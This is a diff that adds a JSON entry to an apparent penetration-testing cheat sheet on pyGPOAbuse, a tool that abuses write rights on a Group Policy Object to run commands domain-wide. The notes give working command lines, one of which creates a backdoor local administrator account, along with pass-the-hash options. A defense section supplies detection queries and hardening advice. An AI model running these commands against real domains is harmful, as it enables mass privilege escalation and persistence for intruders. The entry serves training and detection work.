@@ -1,0 +1,105 @@
+{
+  "id": "ad-pygpoabuse",
+  "name": "pyGPOAbuse - Linux-side GPO Abuse",
+  "command": "pygpoabuse.py <domain>/<user>:<password> -gpo-id <guid> -command '<cmd>'",
+  "description": "pyGPOAbuse is the Linux/Python counterpart of SharpGPOAbuse. When you control (have write rights over) a Group Policy Object, it injects an immediate scheduled task into the GPO so that every machine or user the GPO applies to runs your command at the next refresh, enabling mass code execution or privilege escalation across the domain.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "GPO Abuse",
+  "certifications": [
+    "CPTS",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Hackndo/pyGPOAbuse",
+  "tags": [
+    "pygpoabuse",
+    "gpo",
+    "active-directory",
+    "scheduled-task",
+    "privilege-escalation",
+    "lateral-movement"
+  ],
+  "mitre": [
+    "T1484.001",
+    "T1053.005"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== PREREQ: write rights on a GPO ===\n  # find them with BloodHound (GenericWrite/WriteDACL on GPO) or:\n  #   pyGPOAbuse needs the GPO GUID (from ldap/BloodHound/Get-GPO)\n\n=== ADD IMMEDIATE SCHEDULED TASK (default: add user to local admins) ===\n  pygpoabuse.py <domain>/<user>:<password> -gpo-id <guid>\n  # default payload adds the running user to the local Administrators group on targets\n\n=== CUSTOM COMMAND ===\n  pygpoabuse.py <domain>/<user>:<password> -gpo-id <guid> \\\n     -command 'net user hacker P@ss123! /add && net localgroup administrators hacker /add' \\\n     -taskname \"UpdateTask\" -description \"Update\" -f\n\n=== COMPUTER vs USER scope ===\n  # add -user  to target the user portion of the GPO instead of computer\n\n=== HASH / KERBEROS AUTH ===\n  pygpoabuse.py <domain>/<user> -hashes :<nt_hash> -gpo-id <guid>\n  pygpoabuse.py <domain>/<user> -k -gpo-id <guid>\n\n=== THEN ===\n  # wait for gpupdate (90 min default) or force on a target; task runs as SYSTEM (computer) \n\n=== ALTERNATIVES ===\n  SharpGPOAbuse     # Windows/.NET equivalent\n  pyGPOAbuse is preferred from a Linux foothold / impacket workflow",
+  "examples": [
+    {
+      "label": "Default local-admin task on a GPO",
+      "command": "pygpoabuse.py <domain>/<user>:<password> -gpo-id <guid>"
+    },
+    {
+      "label": "Custom command with NT hash",
+      "command": "pygpoabuse.py <domain>/<user> -hashes :<nt_hash> -gpo-id <guid> -command 'whoami'"
+    }
+  ],
+  "references": [
+    {
+      "title": "pyGPOAbuse",
+      "url": "https://github.com/Hackndo/pyGPOAbuse"
+    },
+    {
+      "title": "MITRE T1484.001 - Group Policy Modification",
+      "url": "https://attack.mitre.org/techniques/T1484/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-sharpgpoabuse",
+      "note": "SharpGPOAbuse is the Windows equivalent.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-gpo-enum",
+      "note": "Enumerate GPO write rights before abusing.",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-gpo-abuse",
+      "note": "CRTP GPO-abuse technique context.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-impacket-dcomexec",
+      "note": "After fleet-wide local-admin, use a remote-exec tool to operate.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "A principal with write access (GenericWrite/WriteDACL/WriteProperty) to a GPO can edit its files in SYSVOL. Adding an immediate scheduled task makes every in-scope computer/user execute arbitrary code at policy refresh, running as SYSTEM for computer-scoped GPOs.",
+    "prerequisites": "Write rights over a linked GPO (or over the GPC/GPT), and credentials/hash for the principal holding them.",
+    "impact": "Mass arbitrary code execution and local-admin creation across all machines/users in the GPO scope - often domain-wide escalation.",
+    "detection": "[MITRE T1484.001/T1053.005] SYSVOL changes to GPO files (ScheduledTasks.xml / Registry.xml) correlated with Directory Service changes (event 5136 on gPCMachineExtensionNames / versionNumber); new scheduled task events (4698) appearing fleet-wide after a GPO edit.",
+    "artifacts": "DC Security log 5136/5137 on GPO objects, SYSVOL file writes to \\Policies\\{GUID}\\Machine\\Preferences\\ScheduledTasks, endpoint event 4698 (scheduled task created) across many hosts, gPCMachineExtensionNames update.",
+    "splunk_spl": "index=wineventlog (EventCode=5136 ObjectClass=groupPolicyContainer) OR EventCode=4698\n| transaction host maxspan=2h\n| search EventCode=5136 EventCode=4698\n| stats dc(host) as affected_hosts values(TaskName) by Account_Name",
+    "elastic_kql": "event.code:4698 or (event.code:5136 and winlog.event_data.ObjectClass:groupPolicyContainer)",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4698 or (EventID == 5136 and AttributeLDAPDisplayName has \"gPCMachineExtensionNames\")\n| summarize Hosts=dcount(Computer), Tasks=make_set(TaskName) by SubjectUserName, bin(TimeGenerated, 2h)\n| where Hosts > 2",
+    "sigma_rules": "ad_gpo_scheduled_task_injection",
+    "prevention": "Audit and tighten GPO ACLs (remove non-admin write); monitor SYSVOL GPO file changes; enable AD object auditing (5136); alert on new fleet-wide scheduled tasks; use tiered admin model so GPO edit rights are highly restricted.",
+    "sources": [
+      "Hackndo/pyGPOAbuse",
+      "https://attack.mitre.org/techniques/T1484/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "GPO edit followed by fleet-wide scheduled task (pyGPOAbuse/SharpGPOAbuse)",
+        "logic": "SecurityEvent\n| where EventID == 4698\n| summarize Hosts=dcount(Computer), Tasks=make_set(TaskName) by SubjectUserName, bin(TimeGenerated, 2h)\n| where Hosts > 2",
+        "data_source": "windows-security",
+        "attack": [
+          "T1484.001",
+          "T1053.005"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate GPO-deployed scheduled tasks during maintenance",
+        "tuning": "Baseline normal GPO-deployed tasks; correlate with authorized GPO change tickets"
+      }
+    ]
+  }
+}
